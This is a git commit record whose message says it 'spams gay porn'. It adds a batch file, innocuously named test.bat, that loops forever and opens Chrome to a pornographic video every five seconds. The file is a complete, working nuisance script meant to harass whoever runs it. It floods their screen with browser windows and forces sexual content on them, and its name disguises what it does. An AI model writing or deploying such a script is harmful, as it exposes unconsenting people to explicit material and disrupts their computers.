7c526bf6916e395e9c9d08079590db19075d67ca
the-irrational <44102221+the-irrational@users.noreply.github.com>
2018-10-12 16:43:21 -0500

    version0.1
    Spams gay porn.

---
+++ test.bat
@@ -0,0 +1,6 @@
+@echo off
+
+:loop
+start "Google Chrome" "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" https://www.pornhub.com/view_video.php?viewkey=ph5b7eec2c59bfe
+TIMEOUT /T 5
+goto loop
